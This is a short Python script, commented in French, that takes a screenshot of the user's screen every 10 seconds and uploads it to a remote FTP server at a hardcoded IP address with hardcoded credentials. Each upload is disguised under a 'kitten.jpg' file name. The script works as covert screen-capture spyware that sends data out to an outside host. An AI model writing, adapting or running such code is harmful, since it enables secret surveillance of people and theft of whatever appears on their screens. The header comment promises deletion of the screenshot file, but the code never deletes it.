#Ouvrir une conenxion FTP, envoyer le fichier, fermer la connexion, supprimer le fichier


import pyautogui, ftplib, time


while True:
	session = ftplib.FTP('10.101.200.38','user1','user1')     
	# Take screenshot
	pic = pyautogui.screenshot()
	     
	# Save the image
	pic.save('Screenshot.png') 

	#connexion to FTP

	filesend = open('Screenshot.png','rb')                  # file to send
	session.storbinary('STOR kitten.jpg' + time.strftime("%Y-%m-%d") , filesend)     # send the file
	filesend.close()                                    # close file and FTP
	session.quit()
	time.sleep(10)